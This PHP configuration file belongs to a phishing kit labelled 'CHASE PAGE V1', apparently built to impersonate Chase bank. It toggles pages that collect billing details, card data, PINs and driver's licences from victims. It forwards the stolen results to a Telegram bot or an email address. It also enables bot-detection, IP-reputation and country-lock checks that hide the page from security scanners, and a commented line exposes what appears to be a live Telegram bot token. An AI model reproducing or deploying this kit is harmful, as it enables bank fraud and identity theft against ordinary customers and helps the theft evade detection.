<?php
// error_reporting(0);
    /*
    |--------------------------------------------------------------------------
    | CHASE PAGE V1
    |--------------------------------------------------------------------------
    |
    | Contact me : @zroxo
    |
    */
$skip2page=true; 
$skipInvalidEmail=true;
$skipCCverify=true;


$ini_array = parse_ini_file("cnf/stng.ini", true);
$redirect = $ini_array['onoff']['redirect'];
$redirect_password = $ini_array['config']['redirect_password'];
$default_protection = $ini_array['onoff']['default_protection'];
$myip_ms = $ini_array['onoff']['myip_ms'];
$ipqualityscore = $ini_array['onoff']['ipqualityscore'];
$antibot_pw = $ini_array['onoff']['antibot_pw'];
$valid_email_true = $ini_array['onoff']['valid_email_true'];
$lock_country = $ini_array['onoff']['lock_country'];
$true_hotmail_login = $ini_array['onoff']['true_hotmail_login'];
$telegram_result = $ini_array['onoff']['telegram_result'];
$email_result = $ini_array['onoff']['email_result'];
$telegram_token = $ini_array['config']['telegram_token'];
$telegram_chatid = $ini_array['config']['telegram_chatid'];
$email_result_config = $ini_array['config']['email_result_config'];
$result_from_email = $ini_array['config']['result_from_email'];
$antibot_pw_key = $ini_array['config']['antibot_pw_key'];
$ipqualityscore_key = $ini_array['config']['ipqualityscore_key'];
$result_pin = $ini_array['config']['result_pin'];
$Show_billing_page = $ini_array['onoff']['Show_billing_page'];
$Show_card_page = $ini_array['onoff']['Show_card_page'];
$get_DL = $ini_array['onoff']['get_DL'];
$only_mobile = $ini_array['onoff']['only_mobile'];
$admin_password = $ini_array['config']['admin_password'];

/*  
//$redirect = "yes"; // Use redirect config ?
//$default_protection = "yes";  // Normall protection always ON.
//$lock_country = "yes"; // Allow Only USA IP
//$email_result = "yes"; // Send result to email ?
//$telegram_result = "yes"; // Send result to telegram ?
//$myip_ms = "yes"; // https://myip.ms/
//$ipqualityscore = "yes"; // https://www.ipqualityscore.com/
//$antibot_pw = "yes"; // https://www.antibot.pw/
//$true_hotmail_login = "yes"; // True hotmail login.
//$valid_email_true = "yes"; // True hotmail Email.

//$redirect_password = "zroxo";
//$email_result_config = "test@gmail.com";
//$antibot_pw_key = "API_KEY_HERE";
//$ipqualityscore_key = "API_KEY_HERE";
//$telegram_token = "1896730069:AAFOXajqXtEZtG3-4YufHadDNrDSfeHiMJ4"; // Create Token from @BotFather
//$telegram_chatid = "@dhdh"; // Channel username example @channelresult (Make sure you add your bot to channel)

*/
?>